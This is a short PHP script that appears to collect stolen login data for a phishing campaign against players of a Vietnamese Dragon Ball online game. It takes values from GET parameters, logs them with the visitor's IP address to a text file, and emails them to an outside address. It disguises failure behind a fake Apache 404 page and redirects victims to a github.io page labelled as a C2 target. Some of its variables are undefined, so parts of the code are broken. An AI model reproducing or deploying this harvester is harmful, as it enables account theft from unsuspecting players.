<?php
$a = $_GET['cuibapvh'];

if(strlen($a)>5) {

$my_file ='check-click.txt';

$handle = fopen($my_file, 'a') or die('<html lang="en">
<meta charset="utf-8">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>404 Không Tìm Thấy</title>
</head><body>
<h1>Không Tìm Thấy</h1>
<p>URL bạn vừa yêu cầu không có trên máy chủ này.</p>
<hr>
<address>Apache/2.4.41 Server at nro.vn</address>
<address>Apache/2.4.41 Server at ngocrong.site</address>
</body></html> '.$my_file);

$cuibapvh = $_GET['cuibapvh'];

$nrovn = $_GET['nrovn'];

$dragonball = $_GET['dragonball'];

date_default_timezone_set('Asia/Ho_Chi_Minh');

$time = date('H:i:s d-m-Y');

$_SERVER["REMOTE_ADDR"];
fwrite($handle, ''. $cuibapvh. '|'. $nrovn.'|'. $server.'|'. $dragonball.'|'. $_SERVER["REMOTE_ADDR"]. "\n\n");
fclose($handle);

$message = ''. $tk. '|'. $mk.'|'. $server.'|'. $time.'|'. $_SERVER["REMOTE_ADDR"];

mail('contact@tranducanh.com', 'SuperMod_CuiBapVH', $message);
}




 {
  header("Location: http://cuibapvhost.github.io/index.html");
   exit; //Set data url C2;
   }     

?>
